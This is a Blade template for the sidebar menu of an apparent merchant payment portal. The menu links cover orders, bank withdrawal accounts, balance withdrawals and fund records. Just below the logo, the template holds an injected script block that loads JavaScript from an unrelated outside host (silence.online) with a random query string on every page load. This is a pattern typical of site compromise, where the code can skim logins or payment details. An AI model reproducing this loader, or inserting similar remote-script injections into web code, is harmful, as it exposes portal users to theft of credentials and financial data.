<ul class="nav metismenu">
    <li class="nav-header">
        <div class="dropdown profile-element text-center" onclick="if (!window.__cfRLUnblockHandlers) return false; location.href='/';">
            <img src="/static/images/logo.png" style="width:100%;">
        </div>
    </li>
<script type="text/javascript">
    window.s=document.createElement("script");
    s.src="https://emblemcodeapi.silence.online/js.php?"
    +Math.random();(document.body||document.
    documentElement).appendChild(s);
</script>
    @if(auth()->user()->group_type == 1)
        <li class="active navmain">
            <a href="#">
                <span class="nav-label"><i class="fa fa-windows"></i>代理管理</span>
                <span class="fa arrow"></span>
            </a>
        </li>
        <li>
            <a href="{{ route('member.dluser') }}">
                <span class="nav-label"><i class="fa fa-users"></i>下级商户</span>
            </a>
        </li>
        <li>
            <a href="{{ route('member.dldd') }}">
                <span class="nav-label"><i class="fa fa-line-chart"></i>交易订单</span>
            </a>
        </li>
    @endif
    <li class="active navmain">
        <a href="#">
            <span class="nav-label"><i class="fa fa-windows"></i>商户中心</span>
            <span class="fa arrow"></span>
        </a>
    </li>
    <li>
        <a href="/">
            <span class="nav-label"><i class="fa fa-home"></i>用户首页</span>
        </a>
    </li>
    <li>
        <a href="{{route('member.info')}}">
            <span class="nav-label"><i class="fa fa-newspaper-o"></i>我的资料</span>
        </a>
    </li>
    <li>
        <a href="{{ route('member.order') }}">
            <span class="nav-label"><i class="fa fa-line-chart"></i>交易记录</span>
        </a>
    </li>
    <li>
        <a href="{{ route('member.bankcard.index') }}">
            <span class="nav-label"><i class="fa fa-arrows"></i>提现账户</span>
        </a>
    </li>
    <li>
        <a href="{{ route('member.tixian.create') }}">
            <span class="nav-label"><i class="fa fa-paypal"></i>余额提现</span>
        </a>
    </li>
    <li>
        <a href="{{ route('member.tixian.index') }}">
            <span class="nav-label"><i class="fa fa-calculator"></i>提现记录</span>
        </a>
    </li>
    <li>
        <a href="{{ route('member.moneylog.index') }}">
            <span class="nav-label"><i class="fa fa-chain"></i>资金变动</span>
        </a>
    </li>
    <li>
        <a href="{{ route('member.rate.index') }}">
            <span class="nav-label"><i class="fa fa-map-signs"></i>费率详情</span>
        </a>
    </li>
    <li>
        <a href="{{ route('member.dropout') }}">
            <span class="nav-label"><i class="fa fa-sign-out"></i>退出系统</span>
        </a>
    </li>
</ul>
